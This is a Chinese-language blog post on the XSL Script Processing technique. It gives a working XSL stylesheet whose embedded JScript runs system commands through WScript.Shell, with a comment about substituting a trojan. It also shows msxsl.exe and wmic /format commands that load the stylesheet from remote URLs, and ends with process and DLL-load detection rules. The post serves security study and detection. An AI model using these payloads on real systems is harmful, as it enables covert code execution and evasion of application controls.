# XSL Script Processing


XSL是指扩展样式表语言(Extension Stylesheet Language)



`msxsl.exe`是微软用于命令行下处理XSL的一个程序，所以通过他，我们可以执行JavaScript进而执行系统命令，下载地址：https://www.microsoft.com/en-us/download/details.aspx?id=21714

执行该工具需要用到2个文件，分别为`XML`及`XSL`文件，msxsl命令行接受参数形式如下：

```bash
msxsl.exe {xmlfile} {xslfile}

# 调用文件内的命令
msxsl.exe {xslfile} {xslfile}
```



### 命令执行

#### 技术复现（MSXSL.EXE）

##### 本地执行

test.xml

```xml
<?xml version="1.0"?>

<?xml-stylesheet type="text/xsl" href="exec.xsl" ?>

<customers>

<customer>

<name>Microsoft</name>

</customer>

</customers>
```

exec.xsl

```xml
<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

xmlns:msxsl="urn:schemas-microsoft-com:xslt"

xmlns:user="http://mycompany.com/mynamespace">

 

<msxsl:script language="JScript" implements-prefix="user">

   function xml(nodelist) {

var r = new ActiveXObject("WScript.Shell").Run("cmd /c calc.exe");

    //这里可以改造为执行你的木马文件如：

	// var r = new ActiveXObject("WScript.Shell").Run("cmd /k cd c:\ & shell.exe");

   return nodelist.nextNode().xml;

 

   }

</msxsl:script>

<xsl:template match="/">

   <xsl:value-of select="user:xml(.)"/>

</xsl:template>

</xsl:stylesheet>
```

执行

```bash
msxsl.exe test.xml exec.xsl
```





##### 远程执行

```bash
msxsl.exe https://raw.githubusercontent.com/xx/master/test.xml  https://raw.githubusercontent.com/xx/master/exec.xsl


```







#### 技术复现（WMIC.EXE）

wmic可通过如下方式执行xsl内的恶意代码

```bash
wmic.exe {wmic_cmd} /FORMAT:{xsl_file}
```

##### 本地执行

```bash
wmic.exe process get name /format:exec.xsl
```



##### 远程执行

```bash
wmic.exe process get name /format:http:/www.xxx.com/exec.xsl
```



https://www.cnblogs.com/backlion/p/10489916.html



### 威胁检测

**数据源：** 进程监视、进程命令行参数、网络的进程使用、DLL监视

#### msxsl.exe

进程特征：

```bash
# 当msxsl.exe作为父进程创建其他进程时视为可疑
ParentImage regex '^.*msxsl\.exe$'
```

加载项特征：

```bash
#当msxsl.exe加载jscript.dll时视为可疑
Image regex '^.*msxsl\.exe$' AND ImageLoaded contains 'jscript.dll'
```



#### wmic.exe

加载项特征

```bash
#当wmic.exe加载jscript.dll时视为可疑
Image regex '^.*wmic\.exe$' AND ImageLoaded contains 'jscript.dll'
```



### 通过MSXSL方式进行鱼叉式网络钓鱼

有年头的参考文章：https://www.anquanke.com/post/id/159316







---

> 作者: [剑胆琴心](http://shuai06.github.io)  
> URL: https://shuai06.github.io/xsl-script-processing/  

